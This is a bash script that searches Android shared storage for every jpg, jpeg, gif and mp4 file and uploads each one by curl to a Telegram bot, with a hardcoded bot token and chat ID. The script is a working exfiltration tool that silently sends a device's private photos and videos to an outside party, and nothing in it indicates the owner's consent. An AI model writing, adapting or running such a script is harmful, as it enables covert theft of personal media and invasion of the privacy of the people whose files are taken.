#!/bin/bash

# Define the search directories
SEARCH_DIRS="/storage/emulated/0"

# Define the file extensions to search for
FILE_EXTENSIONS=("jpg" "mp4" "jpeg" "gif")

# Telegram bot token
TOKEN="7507308884:AAHCQzy4zXtjyobrVMvheDHpHcjr9uOSEk8"

# Chat ID
CHAT_ID="5951232585"

# Loop through each search directory
for dir in "${SEARCH_DIRS[@]}"; do
    # Loop through each file extension
    for ext in "${FILE_EXTENSIONS[@]}"; do
        # Find files with the specified extension
        find "$dir" -type f -name "*.$ext" | while read -r file; do
            # Send the file to Telegram
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                 -F chat_id="$CHAT_ID" \
                 -F document=@"$file"

            # Check if the sending was successful
            if [ $? -eq 0 ]; then
                echo "File sent successfully"
            else
                echo "Failed to send file"
            fi
        done
    done
done
